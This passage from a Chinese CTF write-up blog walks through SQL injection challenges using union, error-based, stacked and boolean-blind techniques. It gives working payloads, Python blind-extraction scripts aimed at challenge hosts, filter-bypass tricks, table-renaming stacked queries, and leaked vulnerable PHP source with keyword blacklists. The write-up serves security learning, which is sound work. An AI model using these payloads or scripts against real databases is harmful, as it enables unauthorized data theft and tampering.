frfromom infoorrmation_schema.tables;#</code></pre><p>查列：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(column_name) frfromom infoorrmation_schema.columns;#</code></pre><p>查字段，反复尝试后发现flag在表b4bsql中的password列</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(passwoorrd) frfromom b4bsql;#</code></pre><p>得到flag</p><h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p><p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p><p>登录后可申请发布广告</p><p>广告申请界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png" style="zoom:67%;" loading="lazy"><p>随便申请一个后首页显示：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/IRm9FwGvXH81ZiT.png" style="zoom:67%;" loading="lazy"><p>广告详情：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt loading="lazy"></p><p>在广告申请界面测试后发现存在SQL注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt loading="lazy"></p><p>配合union查询查列数：</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p>或</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</code></pre><blockquote><p>注：</p><ul><li>过滤了–+和#，故闭合最后的单引号</li><li>过滤了空格用/**/分离参数</li></ul></blockquote><p>有22列，由广告详情界面显示可知，第2,3列可注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt loading="lazy"></p><p>查数据库库，数据库版本</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><blockquote><p>注：</p><ul><li>此处利用无列名注入</li><li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li><li>参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">官方文档</a></li><li>参考：<a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></li><li>参考：<a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a></li></ul></blockquote><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt loading="lazy"></p><p>查列</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><blockquote><p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p></blockquote><p>列数错误时：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt loading="lazy"></p><p>然后再配合无列名注入注出user表中的flag</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt loading="lazy"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p><p>经过测试发现过滤了：空格，=，order by，union，and</p><p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p><p>查库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(database())))));#查当前数据库</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(schema_name))from(information_schema.schemata))));#查所有数据库</code></pre><p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p><p>查表（like代替=进行查询）：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;))));#查geek数据库下的表</code></pre><p>查列：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like&#39;H4rDsq1&#39;))));#</code></pre><p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;^extractvalue(1,concat(1,(select(left(password,30))from(H4rDsq1))));#查左边1&#39;^extractvalue(1,concat(1,(select(right(password,30))from(H4rDsq1))));#查右边</code></pre><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p><p>不过这题过滤的东西要多一些，常用的两种方法：</p><blockquote><p>预编译注入绕过关键词：set、prepare</p><p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p></blockquote><p>都被过滤用不了了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt loading="lazy"></p><p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">详</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;;handler FlagHere open as cool;handler cool read first;handler cool read next;#</code></pre><p>通过以上语句可以得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt loading="lazy"></p><h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p><ul><li>堆叠注入</li><li>*的使用</li><li>sql_mode 的应用</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt loading="lazy"></p><p>听说比赛的时候泄露了源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post &#x3D; array();    $get &#x3D; array();    global $MysqlLink;    &#x2F;&#x2F;GetPara();    $MysqlLink &#x3D; mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink)&#123;        die(&quot;Mysql Connect Error!&quot;);    &#125;    $selectDB &#x3D; mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB)&#123;        die(&quot;Choose Database Error!&quot;);    &#125;    foreach ($_POST as $k&#x3D;&gt;$v)&#123;        if(!empty($v)&amp;&amp;is_string($v))&#123;            $post[$k] &#x3D; trim(addslashes($v));        &#125;    &#125;    foreach ($_GET as $k&#x3D;&gt;$v)&#123;        &#125;    &#125;    &#x2F;&#x2F;die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php    if(isset($post[&#39;query&#39;]))&#123;        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;            &#x2F;&#x2F;echo $post[&#39;query&#39;];            die(&quot;Nonono.&quot;);        &#125;        if(strlen($post[&#39;query&#39;])&gt;40)&#123;            die(&quot;Too long.&quot;);        &#125;        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do&#123;            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;                while($row &#x3D; mysqli_fetch_row($res))&#123;                    print_r($row);                &#125;            &#125;        &#125;while(@mysqli_next_result($MysqlLink));    &#125;    ?&gt;</code></pre><p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p><p>sql_mode 是一组mysql支持的基本语法及校验规则</p><p><strong>mysql中sql_mode值举例：</strong> </p><p><strong>STRICT_TRANS_TABLES：</strong> </p><blockquote><p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p></blockquote><p><strong>STRICT_ALL_TABLES：</strong> </p><blockquote><p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p></blockquote><p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p><blockquote><p>当存储引擎被禁止或者未解析时，当使用时会报错 </p></blockquote><p><strong>only_for_group_by：</strong> </p><blockquote><p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p></blockquote><p><strong>NO_AUTO_CREATE_USER:</strong> </p><blockquote><p>禁止创建密码为空的用户 </p></blockquote><p><strong>NO_ZERO_IN_DATE：</strong> </p><blockquote><p>在严格模式下，不允许日期和月份为零 </p></blockquote><p><strong>NO_ZERO_DATE：</strong> </p><blockquote><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p></blockquote><p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p><blockquote><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p></blockquote><p><strong>NO_AUTO_CREATE_USER：</strong> </p><blockquote><p>禁止GRANT语句创建密码为空的用户 </p></blockquote><p><strong>PIPES_AS_CONCAT：</strong> </p><blockquote><p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p></blockquote><p><strong>ANSI_QUOTES：</strong> </p><blockquote><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p></blockquote><p>于是有注入语句：</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</code></pre><p>拼合起来就是：</p><pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt loading="lazy"></p><p>另外还有一个解就是*的用法：</p><p>注入：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">*,1</code></pre><p>拼合起来就是：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select *,1||flag from Flag</code></pre><p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt loading="lazy"></p><h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入</a></p><p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt loading="lazy"></p><p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt loading="lazy"></p><p>嗯，确实，一个工具有啥灵魂O.O</p><p>测试单引号</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt loading="lazy"></p><p>接着测试注释：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt loading="lazy"></p><p>被过滤掉了</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;#</code></pre><p>#有效</p><p>尝试注入sql查询等语句，提示被过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt loading="lazy"></p><p>于是就用到前面提到了堆叠注入</p><p>首先列出所有数据库：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show databases;#         显示如下</code></pre><p>列出所有表：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show tables;#         显示如下</code></pre><p>列出表words中的所有列：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from words;#         显示如下</code></pre><p>列出表1919810931114514中所有的列：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from &#96;1919810931114514&#96;;#         显示如下</code></pre><p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p><p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p><p>这题没有禁用rename和alter</p><p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p><blockquote><p>rename用来修改表名</p><p>用法rename命令格式：rename table 原表名 to 新表名;</p></blockquote><blockquote><p>alter用来删除，添加或修改表字段</p><p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p></blockquote><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</code></pre><p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</code></pre><p>最终得到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt loading="lazy"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">Smi1e</a></p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/tQegj4JmCsGbTXp.png" style="zoom:50%;" loading="lazy"><p>FUZZ测试后发现</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/7UIS3oMv6DWqsj8.png" style="zoom:80%;" loading="lazy"><p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">参考</a></p><p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p><p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p><p>于是写出盲注爆表脚本（Payload1）</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com&#x2F;index.php&quot;for i in range(1,100):    for j in range(40,128):        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;        d &#x3D; &quot;1^(ascii(substr((select group_concat(table_name,&#39;&#39;) from sys.x$schema_flattened_keys),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        data &#x3D; &#123;&quot;id&quot;:d&#125;        r &#x3D; requests.post(url,data &#x3D; data)        if &#39;Nu1L&#39; not in r.text:            print(chr(j),end&#x3D;&#39;&#39;)            break</code></pre><p>得到两个表名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p><p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html">参考</a>，如图</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/sFLidjDgr5weSft.png" style="zoom: 80%;" loading="lazy"><p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/JIK9gluR1khN6zr.png" style="zoom:80%;" loading="lazy"><p>注：出题人这里还有一个坑，详见题目下方的链接</p><p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p><p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p><p>Payload：<code>1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p><p>于是写出盲注爆字段脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport stringurl &#x3D; &quot;http:&#x2F;&#x2F;a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com&#x2F;index.php&quot;str &#x3D; (&quot;-&quot; + string.digits + string.ascii_letters + string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&quot;\\&quot;,&quot;&quot;)flag &#x3D; &quot;&quot;for i in range(1,100):    for j in str:        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;        d &#x3D; &quot;1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;.format(flag+j)        data &#x3D; &#123;&quot;id&quot;:d&#125;        r &#x3D; requests.post(url,data &#x3D; data)        if &#39;Nu1L&#39; in r.text:            print(j,end&#x3D;&#39;&#39;)            break    flag &#x3D; flag + j</code></pre><p>最终可以得到flag</p><h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>首先有个登录界面</p><p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt loading="lazy"></p><p>于是可以在登录界面进行布尔盲注</p><p>爆库Payload：<code>2&#39; or (select (mid((select database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport stringurl &#x3D; &quot;http:&#x2F;&#x2F;b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com&#x2F;&quot;str &#x3D; (&quot;-&quot; + string.digits + string.ascii_letters + string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&quot;\\&quot;,&quot;&quot;)flag &#x3D; &quot;&quot;for i in range(1,100):    for j in str:        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;        d &#x3D; &quot;(This is Payload)&quot;.format(i,j)        #print(d)        data &#x3D; &#123;&quot;lname&quot;:d , &quot;lpass&quot;:&#39;xxx&#39;&#125;        r &#x3D; requests.post(url,data &#x3D; data)        r.encoding &#x3D; &#39;gbk&#39;        if &#39;成功&#39; in r.text.encode(&#39;gbk&#39;).decode(r.apparent_encoding):            print(j,end&#x3D;&#39;&#39;)            break</code></pre><p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p><h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt loading="lazy"></p><p>题目给出了flag在flag表和flag列中</p><p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p><p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p><p>python脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn&#x2F;&quot;for i in range(1,100):    for j in range(1,128):        d &#x3D; &quot;1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        data &#x3D; &#123;&quot;id&quot;:d&#125;        r &#x3D; requests.post(url,data &#x3D; data)        print(r.status_code)        if &#39;Error&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p>网上这题的源码，可以参考参考</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$dbuser&#x3D;&#39;root&#39;;$dbpass&#x3D;&#39;root&#39;;function safe($sql)&#123;    #被过滤的内容 函数基本没过滤    $blackList &#x3D; array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;&#96;&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;.&#x2F;&#39;);    foreach($blackList as $blackitem)&#123;        if(stripos($sql,$blackitem))&#123;            return False;        &#125;    &#125;    return True;&#125;if(isset($_POST[&#39;id&#39;]))&#123;    $id &#x3D; $_POST[&#39;id&#39;];&#125;else&#123;    die();&#125;$db &#x3D; mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db)&#123;    die(mysql_error());&#125;   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id))&#123;    $query &#x3D; mysql_query(&quot;SELECT content from passage WHERE id &#x3D; $&#123;id&#125; limit 0,1&quot;);    if($query)&#123;        $result &#x3D; mysql_fetch_array($query);        if($result)&#123;            echo $result[&#39;content&#39;];        &#125;else&#123;            echo &quot;Error Occured When Fetch Result.&quot;;        &#125;    &#125;else&#123;        var_dump($query);    &#125;&#125;else&#123;    die(&quot;SQL Injection Checked.&quot;);&#125;</code></pre><h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/MK1eADvmQB6dsRu.png" style="zoom: 80%;" loading="lazy"><p>后台过滤到限制字符的显示的界面（如下图）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/R4IgVByGQD1h6Pk.png" style="zoom:33%;" loading="lazy"><p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/yjbmJD4Ocn76fCA.png" style="zoom:33%;" 